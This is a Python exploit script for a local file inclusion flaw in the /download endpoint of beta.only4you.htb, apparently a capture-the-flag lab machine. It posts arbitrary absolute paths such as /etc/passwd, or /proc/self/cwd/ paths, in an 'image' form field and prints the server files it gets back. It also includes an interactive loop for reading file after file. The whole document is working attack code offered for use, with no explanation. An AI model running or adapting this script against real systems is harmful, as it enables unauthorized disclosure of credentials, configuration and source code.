#!/usr/bin/env python3
from requests import post, exceptions
from argparse import ArgumentParser

def getArguments():
    parser = ArgumentParser(description="Local File Inclusion exploit for beta.only4you.htb")
    parser.add_argument("-p", "--path", required=False, help="Absolute file path (e.g: /etc/passwd)")
    return parser.parse_args()

def readFile(filepath: str) -> str:
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = {"image": filepath}
    response = post("http://beta.only4you.htb/download", headers=headers, data=payload, timeout=5, allow_redirects=False)
    if response.status_code == 500:
        return "Permission denied"
    elif response.status_code == 302:
        return "Not found"
    return response.text

def startInteractiveFileRead():
    print("Press Ctrl+C to exit")
    while True:

        filepath = input("Enter absolute filepath:\n> ")
        if not filepath.startswith('/'):
            filepath = f"/proc/self/cwd/{filepath}"

        try:
            content = readFile(filepath)
            print(content)
        except exceptions.ReadTimeout:
            print("File read timed out")

def main():
    args = getArguments()
    filepath = args.path
    if filepath:
        if not filepath.startswith('/'):
            filepath = f"/proc/self/cwd/{filepath}"
        content = readFile(filepath)
        print(content)
    else:
        try:
            startInteractiveFileRead()
        except KeyboardInterrupt:
            pass
        print("\nQuitting")

if __name__ == "__main__":
    main()
